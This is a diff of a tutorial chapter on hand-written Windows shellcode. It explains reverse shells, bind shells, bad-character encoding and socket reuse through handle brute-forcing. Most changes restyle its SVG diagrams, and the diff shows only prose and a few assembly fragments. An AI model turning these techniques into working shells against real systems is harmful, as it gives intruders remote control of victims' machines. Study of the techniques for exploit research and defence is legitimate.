   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Building "cmd.exe" on the Stack</text>
   <!-- String bytes -->
   <text x="375" y="55" text-anchor="middle" fill="#8b949e" font-size="11">Stack grows downward -- push in reverse order</text>
@@ -1530,9 +1620,14 @@ The high-level flow has six steps, each building on the last.
 
 <div align="center"><svg viewBox="0 0 750 180" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s211" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s211"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s211" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="rs-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
+    <linearGradient id="bg_s211" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s211"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s211" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="180" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="180" rx="10" fill="url(#bg_s211)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s211)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Reverse Shell: 6-Step Pipeline</text>
   <rect x="15" y="55" width="108" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="69" y="76" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">1. Load DLL</text>
@@ -1586,7 +1681,13 @@ load_ws2_32:
 The `sockaddr_in` structure tells `connect()` where to call home. We must build it without null bytes.
 
 <div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="280" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s109" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s109"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s109" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="280" rx="10" fill="url(#bg_s109)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s109)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">sockaddr_in Memory Layout (16 bytes)</text>
   <text x="375" y="52" text-anchor="middle" fill="#8b949e" font-size="11">Pushed in reverse order so fields read correctly at ESP</text>
   <!-- Byte grid header -->
@@ -1669,11 +1770,14 @@ The critical fields: `dwFlags = 0x100` (STARTF_USESTDHANDLES), and `hStdInput/hS
 > `bInheritHandles = TRUE` in CreateProcessA is non-negotiable. Without it, the child process does not inherit the socket handle, and the stdio redirect silently fails.
 
 <div align="center"><svg viewBox="0 0 750 420" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs>
-  <marker id="arrow-g" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
+  <defs>
+    <linearGradient id="bg_s212" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s212"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s212" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+    <marker id="arrow-g" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
   <marker id="arrow-o" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff6b35"/></marker>
-</defs>
-<rect width="750" height="420" rx="8" fill="#0a0e17"/>
+    <linearGradient id="bg_s205" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s205"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s205" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="420" rx="10" fill="url(#bg_s205)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s205)"/>
 <text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="16" font-weight="bold">Reverse Shell Architecture</text>
 <rect x="30" y="60" width="200" height="130" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
 <text x="130" y="85" text-anchor="middle" fill="#e0e7ff" font-size="13" font-weight="bold">ATTACKER</text>
@@ -1733,9 +1837,14 @@ We need to zero out 68 bytes for the `STARTUPINFOA` structure. Rather than pushi
 
 <div align="center"><svg viewBox="0 0 750 230" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s213" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s213"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s213" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="bs-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
+    <linearGradient id="bg_s212" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s212"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s212" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="230" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="230" rx="10" fill="url(#bg_s212)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s212)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">rep stosb: Fast Memory Zeroing</text>
   <!-- Before -->
   <text x="100" y="58" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Before</text>
@@ -1791,11 +1900,14 @@ zero_structs:
 > **Critical detail:** `accept` returns a *new* socket handle for the connected client. This is the handle we use for the STARTUPINFOA stdio redirect -- not the original listening socket. Using the wrong socket is a common mistake.
 
 <div align="center"><svg viewBox="0 0 750 380" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-<defs>
-  <marker id="ba-g" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
+  <defs>
+    <linearGradient id="bg_s214" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s214"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s214" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+    <marker id="ba-g" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
   <marker id="ba-o" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff6b35"/></marker>
-</defs>
-<rect width="750" height="380" rx="8" fill="#0a0e17"/>
+    <linearGradient id="bg_s206" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s206"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s206" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="380" rx="10" fill="url(#bg_s206)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s206)"/>
 <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="16" font-weight="bold">Bind Shell Flow</text>
 <rect x="30" y="55" width="130" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
 <text x="95" y="75" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">1. bind()</text>
@@ -1853,7 +1965,13 @@ The following video demonstrates the bind shell shellcode listening on a port an
 What if the vulnerability filters out far more than just `0x00`? Real-world exploits often have extensive bad character lists. When half the byte range is off limits, every constant must be constructed indirectly.
 
 <div align="center"><svg viewBox="0 0 750 380" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="380" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s110" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s110"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s110" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="380" rx="10" fill="url(#bg_s110)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s110)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Encoding Adapter: Raw Value to Null-Free Assembly</text>
   <!-- Raw value -->
   <rect x="40" y="50" width="200" height="45" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
@@ -1928,7 +2046,13 @@ The core encoding patterns for a restricted-charset reverse shell:
 **Field-by-field struct construction:** Allocate space, then fill each field individually with `mov word/dword ptr`.
 
 <div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="340" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s111" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s111"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s111" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="340" rx="10" fill="url(#bg_s111)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s111)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Restricted Charset Encoding Pipeline</text>
   <rect x="30" y="50" width="185" height="180" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="122" y="72" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Original Bytes</text>
@@ -1961,7 +2085,7 @@ The core encoding patterns for a restricted-charset reverse shell:
   <text x="627" y="218" text-anchor="middle" fill="#8b949e" font-size="9">Size: 186 bytes (+31%)</text>
   <rect x="100" y="260" width="550" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="375" y="282" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Size vs. Safety Trade-off</text>
-  <rect x="130" y="292" width="210" height="12" rx="3" fill="#00ff88" opacity="0.7"/><text x="237" y="302" text-anchor="middle" fill="#0a0e17" font-size="9" font-weight="bold">142 bytes (original)</text>
+  <rect x="130" y="292" width="210" height="12" rx="3" fill="#00ff88" opacity="0.7"/><text x="237" y="302" text-anchor="middle" fill="#0d1117" font-size="9" font-weight="bold">142 bytes (original)</text>
   <rect x="130" y="292" width="275" height="12" rx="3" fill="#ff6b35" opacity="0.4"/><text x="420" y="302" fill="#ff6b35" font-size="9">+44 encoding overhead</text>
   <text x="560" y="302" fill="#8b949e" font-size="9">= 186 bytes total</text>
 </svg></div>
@@ -1969,7 +2093,13 @@ The core encoding patterns for a restricted-charset reverse shell:
 *Figure 12.2 - The encoding pipeline: bad bytes (red) pass through composable transforms to produce clean shellcode (green), at the cost of increased size.*
 
 <div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="300" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s112" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s112"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s112" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="300" rx="10" fill="url(#bg_s112)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s112)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Bad Character Byte Map (Typical Restricted Set)</text>
   <rect x="200" y="42" width="12" height="12" rx="2" fill="#ff3366" opacity="0.8"/><text x="218" y="53" fill="#ff3366" font-size="10">Bad (blocked)</text>
   <rect x="330" y="42" width="12" height="12" rx="2" fill="#00ff88" opacity="0.3"/><text x="348" y="53" fill="#00ff88" font-size="10">Safe (usable)</text>
@@ -1981,22 +2111,22 @@ The core encoding patterns for a restricted-charset reverse shell:
   <text x="550" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xC</text><text x="585" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xD</text><text x="620" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xE</text><text x="655" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xF</text>
   <!-- Row 0x0_ -->
   <text x="105" y="93" fill="#00d4ff" font-size="9" text-anchor="end">0x0_</text>
-  <rect x="116" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.9"/><text x="130" y="93" text-anchor="middle" fill="#0a0e17" font-size="8" font-weight="bold">00</text>
-  <rect x="151" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="165" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">01</text>
-  <rect x="186" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="200" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">02</text>
-  <rect x="221" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="235" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">03</text>
-  <rect x="256" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="270" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">04</text>
-  <rect x="291" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="305" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">05</text>
-  <rect x="326" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="340" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">06</text>
-  <rect x="361" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="375" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">07</text>
-  <rect x="396" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="410" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">08</text>
-  <rect x="431" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="445" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">09</text>
-  <rect x="466" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.9"/><text x="480" y="93" text-anchor="middle" fill="#0a0e17" font-size="8" font-weight="bold">0A</text>
-  <rect x="501" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="515" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">0B</text>
-  <rect x="536" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="550" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">0C</text>
-  <rect x="571" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.9"/><text x="585" y="93" text-anchor="middle" fill="#0a0e17" font-size="8" font-weight="bold">0D</text>
-  <rect x="606" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="620" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">0E</text>
-  <rect x="641" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="655" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">0F</text>
+  <rect x="116" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.9"/><text x="130" y="93" text-anchor="middle" fill="#0d1117" font-size="8" font-weight="bold">00</text>
+  <rect x="151" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="165" y="93" text-anchor="middle" fill="#0d1117" font-size="8">01</text>
+  <rect x="186" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="200" y="93" text-anchor="middle" fill="#0d1117" font-size="8">02</text>
+  <rect x="221" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="235" y="93" text-anchor="middle" fill="#0d1117" font-size="8">03</text>
+  <rect x="256" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="270" y="93" text-anchor="middle" fill="#0d1117" font-size="8">04</text>
+  <rect x="291" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="305" y="93" text-anchor="middle" fill="#0d1117" font-size="8">05</text>
+  <rect x="326" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="340" y="93" text-anchor="middle" fill="#0d1117" font-size="8">06</text>
+  <rect x="361" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="375" y="93" text-anchor="middle" fill="#0d1117" font-size="8">07</text>
+  <rect x="396" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="410" y="93" text-anchor="middle" fill="#0d1117" font-size="8">08</text>
+  <rect x="431" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="445" y="93" text-anchor="middle" fill="#0d1117" font-size="8">09</text>
+  <rect x="466" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.9"/><text x="480" y="93" text-anchor="middle" fill="#0d1117" font-size="8" font-weight="bold">0A</text>
+  <rect x="501" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="515" y="93" text-anchor="middle" fill="#0d1117" font-size="8">0B</text>
+  <rect x="536" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="550" y="93" text-anchor="middle" fill="#0d1117" font-size="8">0C</text>
+  <rect x="571" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.9"/><text x="585" y="93" text-anchor="middle" fill="#0d1117" font-size="8" font-weight="bold">0D</text>
+  <rect x="606" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="620" y="93" text-anchor="middle" fill="#0d1117" font-size="8">0E</text>
+  <rect x="641" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="655" y="93" text-anchor="middle" fill="#0d1117" font-size="8">0F</text>
   <!-- Row 0x1_ -->
   <text x="105" y="113" fill="#00d4ff" font-size="9" text-anchor="end">0x1_</text>
   <rect x="116" y="100" width="548" height="18" rx="2" fill="#ff3366" opacity="0.35"/><text x="390" y="113" text-anchor="middle" fill="#e0e7ff" font-size="8">10..1F  (all control chars -- blocked)</text>
@@ -2050,33 +2180,39 @@ Every shellcode technique so far creates a *new* network connection. **Socket re
 We brute-force handle values from `0x50` to `0x400`, calling `getpeername()` on each. If it succeeds and the returned port matches ours, we have found our socket.
 
 <div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="260" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s113" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s113"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s113" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="260" rx="10" fill="url(#bg_s113)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s113)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Handle Brute-Force Scan</text>
   <text x="375" y="52" text-anchor="middle" fill="#8b949e" font-size="11">Testing handle values 0x50 to 0x400 with getpeername()</text>
   <!-- Handle boxes -->
-  <rect x="35" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
+  <rect x="35" y="70" width="65" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
   <text x="67" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0x50</text>
   <text x="67" y="102" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
-  <rect x="110" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
+  <rect x="110" y="70" width="65" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
   <text x="142" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0x54</text>
   <text x="142" y="102" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
-  <rect x="185" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
+  <rect x="185" y="70" width="65" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
   <text x="217" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0x58</text>
   <text x="217" y="102" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
-  <rect x="260" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
+  <rect x="260" y="70" width="65" height="40" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
   <text x="292" y="92" text-anchor="middle" fill="#8b949e" font-size="14">...</text>
-  <rect x="335" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
+  <rect x="335" y="70" width="65" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
   <text x="367" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0x9C</text>
   <text x="367" y="102" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
-  <rect x="410" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
+  <rect x="410" y="70" width="65" height="40" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
   <text x="442" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0xA0</text>
   <text x="442" y="102" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">?</text>
-  <rect x="485" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2.5"/>
+  <rect x="485" y="70" width="65" height="40" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
   <text x="517" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0xA4</text>
   <text x="517" y="102" text-anchor="middle" fill="#00ff88" font-size="14" font-weight="bold">V</text>
-  <rect x="560" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
+  <rect x="560" y="70" width="65" height="40" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
   <text x="592" y="92" text-anchor="middle" fill="#8b949e" font-size="14">...</text>
-  <rect x="635" y="70" width="80" height="40" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
+  <rect x="635" y="70" width="80" height="40" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
   <text x="675" y="86" text-anchor="middle" fill="#8b949e" font-size="10">0x400</text>
   <text x="675" y="102" text-anchor="middle" fill="#8b949e" font-size="10">end</text>
   <!-- Legend -->
@@ -2115,7 +2251,7 @@ call_getpeername:
     jnz   loop_handle               ; Wrong port
 ```
 
-<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#0a0e17;border-radius:8px"><defs><marker id="ah13" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker></defs><text x="375" y="30" fill="#e0e7ff" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">Socket Reuse: Handle Enumeration</text><rect x="30" y="55" width="130" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/><text x="95" y="85" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">handle = 0x50</text><line x1="160" y1="80" x2="195" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="200" y="55" width="165" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/><text x="282" y="76" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">getpeername(handle,</text><text x="282" y="92" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">&addr, &len)</text><line x1="365" y1="80" x2="395" y2="80" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah13)"/><rect x="400" y="55" width="120" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/><text x="460" y="76" fill="#e0e7ff" font-family="Consolas,monospace" font-size="11" text-anchor="middle">Return != 0?</text><text x="460" y="92" fill="#ff3366" 